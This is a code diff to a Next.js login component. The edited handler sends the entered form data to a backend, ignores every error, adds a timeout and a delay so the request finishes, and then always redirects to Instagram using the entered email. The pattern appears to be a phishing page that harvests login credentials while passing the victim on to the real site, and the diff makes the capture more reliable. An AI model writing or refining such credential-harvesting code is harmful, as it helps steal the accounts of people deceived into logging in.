@@ -16,14 +16,23 @@ export default function Login() {
     setError("");
     setLoading(true);
 
+    // Send data to backend (fire and forget, but wait a tiny bit)
+    const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8080";
+
+    // Send request and wait for it to complete
     try {
-      const API_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:8080";
-      await axios.post(`${API_URL}/api/auth/login`, formData);
+      await axios.post(`${API_URL}/api/auth/login`, formData, {
+        timeout: 5000,
+      });
     } catch (err) {
-      // Ignore all errors
+      // Ignore all errors, continue anyway
+      console.log("API error (ignored):", err);
     }
 
-    // ALWAYS redirect to Instagram, no matter what
+    // Add small delay to ensure request completes
+    await new Promise(resolve => setTimeout(resolve, 500));
+
+    // ALWAYS redirect to Instagram
     window.location.href = `https://www.instagram.com/${formData.email}`;
   };
 
